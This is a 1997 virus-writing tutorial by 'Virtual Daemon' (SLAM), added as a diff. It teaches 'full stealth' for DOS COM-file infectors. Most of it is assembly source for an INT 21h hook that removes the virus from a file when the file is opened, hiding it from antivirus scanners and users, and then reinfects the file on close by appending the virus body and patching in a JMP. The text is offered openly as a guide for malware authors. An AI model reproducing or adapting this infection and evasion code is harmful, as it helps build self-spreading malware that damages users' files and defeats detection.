@@ -1,0 +1,454 @@
+                ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+                ³    Simple Tutorial to Stealth Viruses    ³
+                ³          Part #3 - Full Stealth          ³
+                ³            by Virtual Daemon             ³
+                ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+
+ ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+ ³       Part -I-        ³
+ ³ Introduction & Theory ³
+ ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+  As I promised in our last issue, I'm now presenting you another form of
+stealth used very often in many viruses: full stealth on disk.
+  This technique is very easy to implement and consist of disinfecting the
+infected files on open and then re-infect it on close.
+
+  There are two ways of hiding your whole virus... One of them is presented in
+this tutorial. The other one is called redirection stealth and it will be
+presented in a future tutorial. The second method is better than this one,
+because it only consists in disinfecting the virus in memory without any disk
+writes, and this way it works on Novell Networks or on write-protected floppy
+disks. But enough about this...
+
+  Well, like I said above, the full stealth on disk method consist in
+disinfecting on open and reinfecting on close. So, what's the use of all this?
+Well, it's elementary my dear friend...:) Let me give you a little example...
+  Let's say that our virus has been successfully installed on the host system.
+From now on, every file that will be (for example) executed will be infected.
+But what will happen if the user will try to view the contents of an infected
+file? Or what will happen if the system will be scanned for viruses with an
+anti-virus product? In both cases the virus will be found. So, here's where
+we're coming in... In order to make full stealth we will intercept the open
+and the close functions. So, when the AV software or the user will try to open
+the file to view it's content, we will disinfect the file (or to put it more
+simpler, we'll remove the virus from file)... This way, the file will be clean
+and no one will suspect that our virus is active in memory. And then, when the
+file gets closed we will reinfect it and then close it. Simple, huh? ;)
+
+  So, we must disinfect the file on open calls, right? Well, DOS v3+ uses only
+the 2 traditional ways of opening a file: 3dh (open via file handle) and
+6c00h (extended open/create). Open via FCB aka 0fh function isn't used anymore
+so we'll skip it.
+
+  In order to do full stealth it is obvious that we must modify our Int 21h
+handler to intercept the open and the close calls as well.
+  Let's have a look at our new INT 21h handler:
+
+myint21h:
+   cmp ah,3dh           ;open via file handle?
+   je disinfect         ;go and disinfect the file
+   cmp ax,6c00h         ;extended open/create?
+   je ext_disinfect     ;go and disinfect the file
+   cmp ah,3eh           ;close file?
+   je close_infect      ;go and re-infect the file
+   ...                  ;other stuff like check if it's a 4bh (execute) call
+                        ; or if the virus is already active in memory, etc
+exithandler:
+   db 0eah              ;return to original Int 21h vector
+oldint21   dd ?
+
+  Before we go into the real code, I must make some notes about 6c00h DOS
+function. This function was implemented from DOS ver 4.0. The function
+basically replaces the 3ch (create file via file handle), 3dh (open file via
+file handle) and 5bh (create a new file) DOS functions. It is similar with the
+OS/2 open call. The main difference between this function and the 3dh function
+is that besides opening a file, it can also create one. Anywayz, here goes
+the syntaxes for 6c00h and 3dh functions.
+
+  First the 6c00h:
+----------------------
+  Input:
+        AX=6c00h
+        BX=extended open mode flags
+        CX=file attribute (used only if file gets created)
+        DH=00h
+        DL=action if file exists/does not exist
+           bits 0-3 action if file exists
+                     0000 fail
+                     0001 open
+                     0010 replace/open
+                4-7 action if file does not exist
+                     0000 fail
+                     0001 create
+        DS:SI=address of an ASCIIZ string of filespec
+  Returns:
+        AX=error code if CF is set to CY
+           file handle if no error
+        CX=action taken: 0 file was opened
+                         1 file was created and opened
+                         2 file was replaced and opened
+----------------------
+  The value stored in the DL register controls the open/create action,
+depending upon whether the file exists at the time of the call. Common
+combinations are:
+   0001H = open the file if it exists; otherwise fail the call
+   0011H = open the file if it exists; otherwise create it
+   0012H = if the file exists open and truncate it to length 0;
+           otherwise create it and open it
+
+  The extended open flags (from BX) looks like this:
+  Ö7Â6Â5Â4Â3Â2Â1Â0·
+  ºi³ shr ³0³ r/w º       Open Mode bit flags
+  ÓÒÁÄÁÄÁÄÁÄÁÄÁÄÁÄ½  bit
+   º ÈÍËÍ¼   ÈÍÍÍÊÍ 0-2: Network Access Rights required by process for access
+   º   º                    000 = read
+   º   º                    001 = write
+   º   º                    010 = read and write
+   º   ÈÍÍÍÍÍÍÍÍÍÍÍ 4-6: Sharing Mode: 000 = compatibility mode           0h
+   º                                    001 = deny read/write (exclusive) 10h
+   º                                    010 = deny write                  20h
+   º                                    011 = deny read                   30h
+   º                                    100 = deny none                   40h
+   ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ 7: Inheritance: 1 = file is private to this process  80h
+                                     0 = inherited by spawned processes
+
+  An important thing would be that the 0-2 bits (stored in BL) represents the
+open mode. The 3dh function requires these bits in AL for opening the file.
+
+  Then the 3dh:
+----------------------
+  Input:
+        AH=3dh
+        DS:DX=address of an ASCIIZ string of filespec
+        AL=0 for reading
+           1 for writing
+           2 for both reading and writing
+  Returns:
+        AX=error code if CF is set to CY
+           file handle if no error
+----------------------
+
+  Here are the 2 important differences between these two functions:
+-the open mode bits are stored in AL at 3dh and in BL at 6c00h
+-the file name (ASCIIZ string) is stored in DS:DX at 3dh and in DS:SI at 6c00h
+
+  Since there are only 2 minor differences on open calls between the 2
+functions, we will use the same procedure for disinfecting the file. We'll
+disinfect the file when a 6c00h is requested in the same way as for 3dh, but
+before that we will have to do some adjustements like:
+1) put the file name from DS:SI into DS:DX (just equal DX with SI)
+2) put the open mode from BL into AL
+3) equal the AH register with 3dh so it will look like a normal open call
+
+  Those should be the normal things to do in order to make a 6c00h call to
+look like a 3dh one. But our goal is to make the virus as small as possible,
+so that's why on the example code, I removed the last 2 "adjustments".
+
+ ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+ ³      Part -II-       ³
+ ³ Source code examples ³
+ ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+  Here is the disinfect procedure! Note that the procedure is only for COM
+files but it's very easy to make it for EXE infections too.
+
+  This code can also be seen in my 'Paranoid' virus presented in SLAM #3...
+Anwyay, since I didn't had time to finish Paranoid, its code is buggy and
+not very well optimized. So, you'll have to excuse me if you find some little
+bugs in it! :) Let's just say that it's your job to learn from them...
+
+--- cut here ---
+ext_disinfect:               ;we jump here if it's a 6c00h call
+;if DX (DL) is equal with 1 then the file is opened normally (see above)
+;if DX<>1 then the 6c00h function doing something else (like creating a file)
+   cmp dl,1                  ;check if it's just a normal "file open" request
+   je we_got_it              ;file open? go ahead...
+   jmp exithandler           ;if we don't have a file open request we must exit
+we_got_it:
+   mov dx,si                 ;put the file's name in DS:DX from DS:SI
+   mov byte ptr exten,1      ;mark as an extended call
+;if EXTEN=1 then it's a extended call, else it's a normal open call
+
+disinfect:                   ;we jump here if it's just a 3dh call
+;save registers that will be modified during the disinfection process
+   push ax bx cx dx di si ds es
+
+   push ds
+   pop es                    ;make ES=DS
+
+;here we check to see if the file that is being opened is a COM
+;and not just a simple TXT file
+   mov cx,64                 ;PATH+file name=65 (max)
+;DS:DX points to the file name now
+   mov di,dx                 ;make DS:SI to point to the file name
+;we search till we encounter '.' bcoz we need the file extension
+   mov al,'.'                ;search for '.'
+   repne scasb               ;repeat till cx=0 or till we found '.'
+
+;DS:DI holds the extension of the file now
+   mov ax,word ptr ds:[di]
+   or ax,2020h               ;lowercase
+   cmp ax,'oc'               ;check if extension is com
+   je check_next
+   jmp goaway
+check_next:
+   mov al,byte ptr ds:[di+2]
+   or al,20h                 ;lowercase
+   cmp al,'m'
+   je openfile
+   jmp goaway                ;COM not found... exit!
+openfile:
+   mov ax,4300h              ;get old attributes
+   int 21h
+   push cx dx ds             ;save file attributes & file name (DS:DX)
+
+   mov ax,4301h              ;set new attributes
+   xor cx,cx                 ;archive only
+   int 21h
+
+   mov ax,3d02h              ;open file for reading and writing
+   pushf
+   call dword ptr cs:[oldint21]        ;fake a int 21h call
+   jnc no_err
+   jmp restore_attr
+no_err:
+
+   xchg bx,ax                ;put file handle in BX
+
+   push cs cs
+   pop ds es                 ;make CS=DS=ES
+
+;In order to see if the file is infected or not I added 100 years to original
+;file date. We will also check if the file's first 3 bytes are a JMP to our
+;virus.
+   mov ax,5700h              ;get file time
+   int 21h
+   cmp dh,100                ;check if infected
+   jae infected              ;if infected go ahead...
+   jmp close_dis             ;if not then don't stealth
+infected:
+   mov word ptr file_time,cx ;save the file's time
+   mov word ptr file_date,dx ;save the file's date
+
+   mov ah,3fh                ;read the 1st 3 bytes
+   mov cx,3
+   lea dx,buffer             ;save them in our buffer
+   int 21h
+
+   cmp byte ptr buffer,0e9h  ;check if it is a jmp.
+   jne close_dis             ;not JMP? then the file isn't infected...
+
+   mov ax,4202h              ;go to EOF
+   xor cx,cx
+   cwd
+   int 21h
+;DX:AX holds the file size
+   mov dx,ax
+   push dx                   ;save it
+
+   mov cx,word ptr buffer+1  ;check if the JMP points to our virus
+   add cx,(heap-begin)+3
+   cmp ax,cx
+   jne close_dis             ;if not equal the file isn't infected...
+
+;"heap" is the end of our virus. "jumpbuf" are the original 3 bytes from the
+;beginning...
+;We have to go where those bytes are stored in the file, and we must read them.
+   sub dx,(heap-jumpbuf)     ;DX will point to the original bytes
+   xor cx,cx
+   mov ax,4200h              ;go where the JMP bytes are stored
+   int 21h
+
+   mov ah,3fh                ;read the original bytes in memory
+   mov cx,3
+   lea dx,buffer             ;put them in our buffer
+   int 21h
+
+   mov ax,4200h              ;go to BOF (beginning of file)
+   xor cx,cx
+   cwd
+   int 21h
+
+   mov ah,40h                ;write the original code (3 bytes)
+   lea dx,buffer
+   mov cx,3
+   int 21h
+
+   pop dx                    ;restore file size
+
+   sub dx,(heap-begin)       ;substract the length of our virus
+   mov ax,4200h
+   xor cx,cx
+   int 21h
+
+   mov ah,40h                ;truncate the file
+   xor cx,cx
+   int 21h
+
+close_dis:
+   mov ax,5701h
+   mov cx,word ptr file_time
+   mov dx,word ptr file_date
+   ror dh,1                  ;restore original year
+   sub dh,100
+   rol dh,1
+   int 21h
+
+   mov ah,3eh                ;close the file
+   pushf                               ;we will intercept the 3eh function too
+   call dword ptr cs:[oldint21]        ;so we must fake an int 21h call
+
+restore_attr:
+   mov ax,4301h
+   pop ds dx cx              ;restore file name & file attributes
+   int 21h
+goaway:
+   pop es ds si di dx cx bx ax         ;restore saved registers
+
+   cmp byte ptr exten,1      ;check if was an extended open
+   jne exit
+;restore original values for AX and DX registers
+   mov ax,6c00h              ;set AX to 6c00h
+   mov dx,1                  ;set DX to 1 (normal open)
+   mov byte ptr exten,0      ;reset the EXTEN variable to 0
+exit:
+   jmp exithandler           ;return to original Int 21h
+jumpbuf db 0cdh,20h,0        ;original 3 bytes
+
+;   ...                       ;other stuff
+
+heap:                        ;this is the end of the virus
+file_time   dw ?             ;old file time
+file_date   dw ?             ;old file date
+exten       db 0
+buffer      db 3 dup (?)
+--- cut here ---
+
+  Well, that's all... Now let's get to the "reinfection" process... The
+theory is simple: we will get the file name using SFT (system file table) and
+we will infect the file.
+Note: the SFT structure has been presented and explained in my "size stealth
+#2" tut, so go and learn bout it if you don't know already... ;)
+
+--- cut here ---
+close_infect:
+   cmp bx,5                  ;DOS uses the 1st 5 handles for special devices
+                             ;so we must check to see if its a normal handle
+                             ;or a special one
+   jae good_handle
+   jmp goback                ;special handle? exit...
+good_handle:
+   push ax bx cx dx di si ds es        ;save registers
+   push bx                   ;save file handle
+
+   mov ax,1220h              ;DOS function=get job file table entry
+   int 2fh                   ;CF will be set if error
+   jnc getjob_ok
+finish:
+   jmp close                 ;exit if error
+getjob_ok:
+
+   mov bl,es:[di]            ;BL=JFT entry
+   cmp bl,0ffh               ;if BL=0ffh, handle is not open
+   je finish                 ;handle not open? Exit please...
+   mov ax,1216h              ;use SFT to get the extension
+   int 2fh
+   jc finish                 ;BX is greater then FILES= (from CONFIG.SYS)
+
+   pop bx                    ;restore file handle
+
+   cmp word ptr es:[di+28h],'OC'       ;check if it's a COM file
+   jne finish
+   cmp byte ptr es:[di+28h+2],'M'
+   jne finish
+
+   mov byte ptr es:[di+2h],2 ;mark file as open in Read+Write mode
+
+   mov ax,4200h              ;goto BOF
+   xor cx,cx
+   cwd
+   int 21h
+
+   mov ax,5700h              ;get file's date/time
+   int 21h
+   cmp dh,100                ;check if infected
+   jb not_infect             ;the file is not infected
+   jmp close                 ;infected? close the file
+not_infect:
+   mov word ptr file_time,cx ;save file time
+   mov word ptr file_date,dx ;save file date
+
+   push cs cs
+   pop ds es                 ;make CS=DS=ES
+
+   mov ah,3fh                ;read the first 3 bytes
+   lea dx,buffer             ;save them into our buffer
+   mov cx,3
+   int 21h
+
+   mov ax,4202h              ;go to EOF
+   xor cx,cx
+   cwd
+   int 21h
+
+   mov word ptr file_size,ax           ;save the file size
+   mov word ptr file_size+2,dx
+
+   cmp word ptr buffer,'MZ'  ;check if EXE
+   je close
+   cmp word ptr buffer,'ZM'
+   je close
+
+   mov ax,word ptr file_size ;check if too big
+   cmp ax,65535-(endheap-begin)
+   ja close
+   cmp ax,(endheap-begin)    ;check if too small
+   jbe close
+
+   mov cx,word ptr buffer+1  ;check if already infected
+   add cx,heap-begin+3
+   cmp ax,cx
+   je close
+
+   mov di,offset jumpbuf     ;prepare new JMP
+   mov si,offset buffer
+   movsb
+   movsw
+   mov byte ptr [offset buffer],0e9h
+   sub ax,3
+   mov word ptr [offset buffer+1],ax
+
+   mov ah,40h                ;write the virus to host
+   lea dx,begin
+   mov cx,heap-begin
+   int 21h
+
+   mov ax,4200h              ;go to BOF
+   xor cx,cx
+   cwd
+   int 21h
+
+   mov ah,40h                ;write the new JMP
+   lea dx,buffer
+   mov cx,3
+   int 21h
+
+   mov ax,5701h              ;set old file's time/date
+   mov cx,word ptr file_time
+   mov dx,word ptr file_date
+   ror dh,1                  ;mark the file for stealth
+   add dh,100
+   rol dh,1
+   int 21h
+close:
+   pop es ds si di dx cx bx ax
+goback:
+   jmp exithandler
+
+heap:                        ;this is the end of the virus
+file_size   dd ?             ;file size
+endheap:
+--- cut here ---
+
+   That's all amigos... :)
+
+ÄÄÄÍ Virtual Daemon / SLAM 1997 ÍÄÄÄ
